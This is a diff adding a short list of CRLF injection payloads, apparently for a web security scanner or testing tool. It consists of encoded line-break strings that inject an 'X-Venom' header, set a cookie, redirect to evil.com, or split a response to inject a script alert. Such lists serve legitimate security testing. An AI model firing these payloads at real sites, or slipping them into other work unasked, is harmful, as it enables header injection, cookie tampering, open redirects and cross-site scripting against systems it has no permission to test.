@@ -1,0 +1,12 @@
+# CRLF Injection Payloads
+%0d%0aX-Venom: injected
+%0a%0dX-Venom: injected
+%0d%0aSet-Cookie: venom=injected
+%0d%0aLocation: https://evil.com
+%0aX-Venom: injected
+%0a%09X-Venom: injected
+%E5%98%8A%E5%98%8DX-Venom: injected
+\r\nX-Venom: injected
+\nX-Venom: injected
+%0d%0a%0d%0a<script>alert(1)</script>
+%23%0d%0aX-Venom: injected
